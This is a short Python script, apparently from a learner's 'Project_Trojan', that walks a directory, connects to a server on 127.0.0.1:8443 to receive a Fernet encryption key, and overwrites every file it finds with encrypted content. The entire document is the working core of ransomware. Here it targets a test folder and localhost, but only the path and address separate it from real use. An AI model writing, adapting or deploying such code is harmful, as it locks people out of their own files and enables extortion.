import socket
from cryptography.fernet import Fernet
import os 

def list_files(directory):
    files_list = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            files_list.append(os.path.join(root, file))
    return files_list


def establish_connection(server_ip, port,files):
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((server_ip, port))
    
    key = conn.recv(1024)
    fernet = Fernet(key)
    for file in files:
        print(file)
        with open(file, 'rb') as file1:
            file_data = file1.read()
    
        encrypted_data = fernet.encrypt(file_data)
    
        with open(file, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)
    
    conn.close()




files=list_files(r'D:\תכנות\Venv\Pro Club\Project_Trojan\files_to_disrupt')
establish_connection('127.0.0.1', 8443,files)
